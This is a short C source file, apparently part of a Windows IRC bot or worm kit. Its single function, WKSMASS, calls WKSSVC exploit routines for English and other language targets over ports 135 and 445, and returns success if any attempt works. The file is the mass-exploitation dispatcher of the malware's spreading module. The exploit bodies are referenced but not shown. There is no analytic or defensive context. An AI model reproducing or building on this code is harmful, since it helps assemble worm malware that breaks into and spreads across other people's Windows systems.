#include "includes.h"
#include "functions.h"
#include "externs.h"

BOOL WKSMASS(EXINFO exinfo)
{
	exinfo.port = 135;
	BOOL bWksEng135 = ScriptGod_WKSSVC_Eng(exinfo);
    exinfo.port = 445;
	BOOL bWksEng445 = ScriptGod_WKSSVC_Eng(exinfo);
    exinfo.port = 135;
	BOOL bWksOth135 = ScriptGod_WKSSVC_Other(exinfo);
    exinfo.port = 445;
	BOOL bWksOth445 = ScriptGod_WKSSVC_Other(exinfo);

	return bWksEng135 || bWksEng445 || bWksOth135 || bWksOth445 ? TRUE : FALSE;
}
